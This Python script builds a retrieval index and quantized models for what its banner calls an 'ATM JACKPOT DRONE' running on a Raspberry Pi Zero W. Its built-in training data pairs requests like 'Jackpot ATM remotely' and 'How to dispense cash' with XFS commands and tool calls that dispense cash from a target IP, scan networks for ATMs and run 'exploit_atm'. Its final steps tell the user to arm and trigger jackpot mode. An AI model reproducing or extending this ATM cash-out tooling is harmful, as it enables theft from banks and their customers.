#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
build_faiss.py - Fully Autonomous FAISS Index Builder
NO INTERACTION REQUIRED - Just run and it works
Optimized for Raspberry Pi Zero W
"""

import os
import sys
import json
import numpy as np
import pickle
from pathlib import Path
import argparse
import warnings
warnings.filterwarnings('ignore')

# ============================================================================
# CONFIGURATION - AUTO-DETECTS EVERYTHING
# ============================================================================

# Auto-detect paths
BASE_DIR = Path(__file__).parent.absolute()
DATA_DIR = BASE_DIR / 'data'
MODELS_DIR = BASE_DIR / 'models'
DATASETS_DIR = BASE_DIR / 'datasets'

# Create directories
for d in [DATA_DIR, MODELS_DIR, DATASETS_DIR]:
    d.mkdir(exist_ok=True, parents=True)

# File paths
FAISS_INDEX_PATH = DATA_DIR / 'faiss_index.bin'
TEXTS_PATH = DATA_DIR / 'texts.npy'
RESPONSES_PATH = DATA_DIR / 'responses.npy'
ONNX_EMBEDDER_PATH = MODELS_DIR / 'embedder.onnx'
ONNX_RERANKER_PATH = MODELS_DIR / 'reranker.onnx'

# Auto-detect dataset files
TRAIN_CSV = DATASETS_DIR / 'train.csv'
TEST_CSV = DATASETS_DIR / 'test.csv'
ALPACA_JSON = DATASETS_DIR / 'train_alpaca.json'

# ============================================================================
# STEP 1: LOAD TRAINING DATA (AUTO-DETECT)
# ============================================================================

def load_training_data():
    """Auto-load training data from multiple sources"""
    print("📊 Loading training data...")
    training_data = []
    
    # 1. Try loading Alpaca JSON
    if ALPACA_JSON.exists():
        try:
            with open(ALPACA_JSON, 'r') as f:
                alpaca_data = json.load(f)
            for item in alpaca_data:
                if isinstance(item, dict):
                    text = item.get('instruction', '')
                    if item.get('input'):
                        text += ' ' + item.get('input')
                    response = item.get('output', '')
                    if text and response:
                        training_data.append((text, response))
            print(f"   ✅ Loaded {len(training_data)} Alpaca records")
        except Exception as e:
            print(f"   ⚠️ Could not load Alpaca: {e}")
    
    # 2. Try loading CSV datasets
    if TRAIN_CSV.exists():
        try:
            import pandas as pd
            df = pd.read_csv(TRAIN_CSV)
            for _, row in df.iterrows():
                text = row.get('text', '')
                label = row.get('label', '')
                if text and label and '### INSTRUCTION' in str(text):
                    # Parse instruction
                    parts = str(text).split('### OUTPUT')
                    if len(parts) > 1:
                        question = parts[0].replace('### INSTRUCTION', '').replace('### INPUT', '').strip()
                        answer = parts[1].strip()
                        if question and answer:
                            training_data.append((question[:500], answer[:500]))
            print(f"   ✅ Loaded {len(training_data)} records from train.csv")
        except Exception as e:
            print(f"   ⚠️ Could not load train.csv: {e}")
    
    # 3. Load test.csv as well
    if TEST_CSV.exists():
        try:
            import pandas as pd
            df = pd.read_csv(TEST_CSV)
            for _, row in df.iterrows():
                text = row.get('text', '')
                label = row.get('label', '')
                if text and label and '### INSTRUCTION' in str(text):
                    parts = str(text).split('### OUTPUT')
                    if len(parts) > 1:
                        question = parts[0].replace('### INSTRUCTION', '').replace('### INPUT', '').strip()
                        answer = parts[1].strip()
                        if question and answer:
                            training_data.append((question[:500], answer[:500]))
            print(f"   ✅ Loaded {len(training_data)} records from test.csv")
        except Exception as e:
            print(f"   ⚠️ Could not load test.csv: {e}")
    
    # 4. If no data found, use built-in training data
    if not training_data:
        print("   ⚠️ No external data found. Using built-in training data.")
        training_data = get_builtin_training_data()
    
    # Remove duplicates
    seen = set()
    unique_data = []
    for text, response in training_data:
        key = (text[:100], response[:100])
        if key not in seen:
            seen.add(key)
            unique_data.append((text, response))
    
    print(f"   📊 Total unique records: {len(unique_data)}")
    return unique_data

def get_builtin_training_data():
    """Built-in training data if no external files exist"""
    return [
        ("What is XFS?", "XFS (Extensions for Financial Services) is a standard for financial applications on Windows."),
        ("How to check ATM status", "TOOL: shell\nARGS: xfsc.exe -c 'cdm status'"),
        ("How to dispense cash", "TOOL: xfs_remote\nARGS: <target_ip> 7777 cdm dispense 100 20"),
        ("Scan for ATMs", "TOOL: scan_network\nARGS: 192.168.1.0/24"),
        ("Open XFS connection", "TOOL: shell\nARGS: xfsc.exe -c 'open CashDispenser_1'"),
        ("Close XFS connection", "TOOL: shell\nARGS: xfsc.exe -c 'close CashDispenser_1'"),
        ("Reset XFS dispenser", "TOOL: shell\nARGS: xfsc.exe -c 'cdm reset'"),
        ("Get XFS capabilities", "TOOL: shell\nARGS: xfsc.exe -c 'cdm caps'"),
        ("Jackpot ATM remotely", "TOOL: exploit_atm\nARGS: <target_ip> 7777"),
        ("Start autonomous drone", "TOOL: start_drone\nARGS: 192.168.1.0/24 60"),
        ("Get ATM status", "TOOL: xfs_status\nARGS: <target_ip>"),
        ("Fingerprint XFS target", "TOOL: fingerprint\nARGS: <target_ip>"),
        ("Discover ATMs on network", "TOOL: discover_atms\nARGS: 192.168.1.0/24"),
        ("Enumerate XFS services", "TOOL: enum_xfs\nARGS: <target_ip>"),
        ("How to attack ATM", "TOOL: xfs_jackpot\nARGS: <target_ip> 7777 100 20"),
    ]

# ============================================================================
# STEP 2: BUILD FAISS INDEX (AUTOMATIC)
# ============================================================================

def build_faiss_index(training_data):
    """Build FAISS index from training data - NO INTERACTION"""
    print("\n🔧 Building FAISS index...")
    
    try:
        # Import required libraries
        from embedder import Embedder
        import faiss
        import numpy as np
        
        # Initialize embedder
        print("   🧠 Initializing embedder...")
        embedder = Embedder()
        
        # Generate embeddings
        texts = [t[0] for t in training_data]
        responses = [t[1] for t in training_data]
        
        print(f"   📝 Generating embeddings for {len(texts)} texts...")
        embeddings = embedder.encode_batch(texts)
        
        # Build FAISS index
        dim = embeddings.shape[1]
        index = faiss.IndexFlatL2(dim)
        index.add(embeddings.astype(np.float32))
        
        # Save index and data
        faiss.write_index(index, str(FAISS_INDEX_PATH))
        np.save(str(TEXTS_PATH), np.array(texts, dtype=object))
        np.save(str(RESPONSES_PATH), np.array(responses, dtype=object))
        
        # Save metadata
        metadata = {
            'dimension': dim,
            'records': len(texts),
            'embedding_model': 'all-MiniLM-L6-v2',
            'version': '3.0'
        }
        with open(DATA_DIR / 'index_metadata.json', 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"   ✅ FAISS index saved: {FAISS_INDEX_PATH}")
        print(f"      - Dimension: {dim}")
        print(f"      - Records: {len(texts)}")
        print(f"      - Size: ~{len(texts) * dim * 4 / 1024:.1f} KB")
        
        return True
        
    except ImportError as e:
        print(f"   ⚠️ Missing dependency: {e}")
        print("   📦 Installing required packages...")
        os.system("pip install faiss-cpu sentence-transformers")
        return False
    except Exception as e:
        print(f"   ❌ Error building index: {e}")
        return False

# ============================================================================
# STEP 3: EXPORT ONNX MODELS (AUTOMATIC)
# ============================================================================

def export_onnx_models():
    """Export and quantize models to ONNX - NO INTERACTION"""
    print("\n🔧 Exporting ONNX models for Pi Zero W...")
    
    # Check if models already exist
    if ONNX_EMBEDDER_PATH.exists() and ONNX_RERANKER_PATH.exists():
        print("   ✅ ONNX models already exist. Skipping export.")
        print(f"      - Embedder: {ONNX_EMBEDDER_PATH}")
        print(f"      - Reranker: {ONNX_RERANKER_PATH}")
        return True
    
    try:
        print("   ⚠️ ONNX export requires PyTorch and transformers.")
        print("   📦 Installing required packages...")
        os.system("pip install torch transformers onnx onnxruntime")
        
        # Try to export embedder
        print("   📤 Exporting embedder to ONNX...")
        try:
            from sentence_transformers import SentenceTransformer
            import torch
            
            model = SentenceTransformer('all-MiniLM-L6-v2')
            model.eval()
            
            # Create dummy input
            dummy_input = ["test text"]
            
            # Export to ONNX
            torch.onnx.export(
                model,
                dummy_input,
                str(ONNX_EMBEDDER_PATH),
                input_names=['input'],
                output_names=['output'],
                dynamic_axes={'input': {0: 'batch_size'}, 'output': {0: 'batch_size'}},
                opset_version=11
            )
            print(f"   ✅ Embedder exported: {ONNX_EMBEDDER_PATH}")
        except Exception as e:
            print(f"   ⚠️ Could not export embedder: {e}")
        
        # Try to export reranker
        print("   📤 Exporting reranker to ONNX...")
        try:
            from transformers import AutoTokenizer, AutoModelForSequenceClassification
            import torch
            
            model_name = 'cross-encoder/ms-marco-MiniLM-L-2-v2'
            tokenizer = AutoTokenizer.from_pretrained(model_name)
            model = AutoModelForSequenceClassification.from_pretrained(model_name)
            model.eval()
            
            # Create dummy input
            dummy_input = ["test query", "test candidate"]
            
            # Export to ONNX
            torch.onnx.export(
                model,
                tokenizer(dummy_input, return_tensors='pt', padding=True, truncation=True),
                str(ONNX_RERANKER_PATH),
                input_names=['input_ids', 'attention_mask'],
                output_names=['output'],
                dynamic_axes={'input_ids': {0: 'batch_size'}, 'attention_mask': {0: 'batch_size'}},
                opset_version=11
            )
            print(f"   ✅ Reranker exported: {ONNX_RERANKER_PATH}")
        except Exception as e:
            print(f"   ⚠️ Could not export reranker: {e}")
        
        return True
        
    except Exception as e:
        print(f"   ⚠️ ONNX export failed: {e}")
        print("   📝 Skipping ONNX export. Using fallback models.")
        return False

# ============================================================================
# STEP 4: OPTIMIZE FOR PI ZERO W (AUTOMATIC)
# ============================================================================

def optimize_for_pi():
    """Apply Pi Zero W optimizations - NO INTERACTION"""
    print("\n🔧 Optimizing for Raspberry Pi Zero W...")
    
    try:
        # Check memory
        import psutil
        memory_mb = psutil.virtual_memory().total / (1024 * 1024)
        print(f"   💾 Available RAM: {memory_mb:.0f} MB")
        
        if memory_mb < 1024:
            print("   ⚠️ Low memory detected. Applying optimizations...")
            
            # Optimize FAISS index for memory
            if FAISS_INDEX_PATH.exists():
                try:
                    import faiss
                    import numpy as np
                    
                    # Load index
                    index = faiss.read_index(str(FAISS_INDEX_PATH))
                    
                    # Convert to IVF for memory efficiency
                    if index.ntotal > 100:
                        quantizer = faiss.IndexFlatL2(index.d)
                        ivf_index = faiss.IndexIVFFlat(quantizer, index.d, min(100, index.ntotal // 10))
                        ivf_index.train(np.random.randn(100, index.d).astype(np.float32))
                        ivf_index.add(index.reconstruct_n(0, index.ntotal))
                        
                        # Save optimized index
                        faiss.write_index(ivf_index, str(DATA_DIR / 'faiss_index_ivf.bin'))
                        print(f"   ✅ Created memory-optimized IVF index")
                except Exception as e:
                    print(f"   ⚠️ Could not optimize index: {e}")
        
        # Check if running on Pi
        try:
            import RPi.GPIO as GPIO
            print("   🍓 Raspberry Pi detected! Applying Pi-specific optimizations...")
            
            # Create Pi-optimized config
            pi_config = {
                'low_memory_mode': True,
                'disable_bluetooth': True,
                'cpu_governor': 'performance',
                'swap_size_mb': 1024
            }
            with open(DATA_DIR / 'pi_config.json', 'w') as f:
                json.dump(pi_config, f, indent=2)
            print("   ✅ Pi configuration saved")
        except:
            pass
        
        return True
        
    except Exception as e:
        print(f"   ⚠️ Optimization warning: {e}")
        return True

# ============================================================================
# MAIN - FULLY AUTOMATIC
# ============================================================================

def main():
    """Main build process - NO INTERACTION REQUIRED"""
    print("=" * 60)
    print("🔨 ATM JACKPOT DRONE - FAISS INDEX BUILDER")
    print("   Fully Automatic - No Interaction Required")
    print("=" * 60)
    print()
    
    # Step 1: Load training data
    training_data = load_training_data()
    
    if not training_data:
        print("❌ No training data found!")
        print("📝 Creating minimal training data...")
        training_data = get_builtin_training_data()
        print(f"   ✅ Created {len(training_data)} built-in records")
    
    # Step 2: Build FAISS index
    success = build_faiss_index(training_data)
    
    if not success:
        print("\n⚠️ FAISS index build failed. Trying with minimal data...")
        training_data = get_builtin_training_data()
        success = build_faiss_index(training_data)
    
    # Step 3: Export ONNX models (optional)
    if success:
        export_onnx_models()
        
        # Step 4: Optimize for Pi
        optimize_for_pi()
    
    # Summary
    print("\n" + "=" * 60)
    print("📊 BUILD SUMMARY")
    print("=" * 60)
    
    # Show what was created
    files_created = []
    for f in [FAISS_INDEX_PATH, TEXTS_PATH, RESPONSES_PATH, ONNX_EMBEDDER_PATH, ONNX_RERANKER_PATH]:
        if f.exists():
            size = f.stat().st_size / (1024 * 1024)
            files_created.append(f"{f.name} ({size:.2f} MB)")
    
    if files_created:
        print(f"✅ Created {len(files_created)} files:")
        for f in files_created:
            print(f"   - {f}")
    else:
        print("⚠️ No files created. Check errors above.")
    
    print("\n📁 Files location:")
    print(f"   Data: {DATA_DIR}")
    print(f"   Models: {MODELS_DIR}")
    print()
    print("🚀 Next steps:")
    print("   1. Transfer data/ and models/ to your Pi Zero W")
    print("   2. Run: python3 run.py")
    print("   3. Run: /arm to arm jackpot mode")
    print("   4. Run: /trigger to execute")
    print("=" * 60)

if __name__ == "__main__":
    main()
